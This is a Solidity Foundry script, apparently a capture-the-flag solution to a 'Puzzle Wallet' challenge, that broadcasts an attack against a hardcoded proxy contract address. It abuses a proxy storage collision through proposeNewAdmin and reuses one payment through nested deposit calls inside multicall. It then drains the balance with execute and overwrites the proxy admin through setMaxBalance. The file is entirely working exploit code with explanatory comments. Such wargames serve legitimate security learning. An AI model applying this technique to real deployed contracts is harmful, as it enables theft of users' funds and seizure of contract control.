// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {PuzzleWallet,PuzzleProxy} from "../src/PuzzleWallet.sol";

contract PuzzleWalletAttack is Script {
    PuzzleWallet public wallet;
    PuzzleProxy public proxy;

    constructor() {
        wallet = PuzzleWallet(0xad8D09e3E2CB54075D6EdaeB47201De61e3E7F69);
        proxy = PuzzleProxy(payable(0xad8D09e3E2CB54075D6EdaeB47201De61e3E7F69));
    }

    function run() external {
        vm.startBroadcast();

        bytes[] memory deposit = new bytes[](1);
        bytes[] memory multicall = new bytes[](2);

        // Use abi.encodeWithSelector function to encode the function selector of the deposit function from the wallet contract. 
        // The function selector is the first four bytes of the Keccak (SHA-3) hash of the function signature. 
        deposit[0] = abi.encodeWithSelector(wallet.deposit.selector);

        // Use abi.encodeWithSelector function to encode the function selector of the deposit function from the wallet contract. 
        // The function selector is the first four bytes of the Keccak (SHA-3) hash of the function signature. 
        multicall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        // This line does the same as the previous one, but for the multicall function of the wallet contract. 
        // It also includes the deposit variable as an argument to the multicall function. 
        multicall[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit);

        // Propose that the caller of the current function should become the new admin of the proxy contract.
        proxy.proposeNewAdmin(msg.sender);

        // Adding the caller of the current function to the whitelist of the wallet contract.
        wallet.addToWhitelist(msg.sender);

        // call the multicall function on the wallet contract, passing an array of function calls to be executed, 
        // and sending 0.001 ether along with the function call. 
        wallet.multicall{value: 0.001 ether}(multicall);
        
        // Call the execute function on the wallet contract, passing the caller's address, 0.002 ether, and an empty string as arguments.
        wallet.execute(msg.sender, 0.002 ether, "");

        // Call setMaxBalance (wallet) with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(address(msg.sender))));

        console.log("New administrator is : ", proxy.admin());

        vm.stopBroadcast();
    }
}
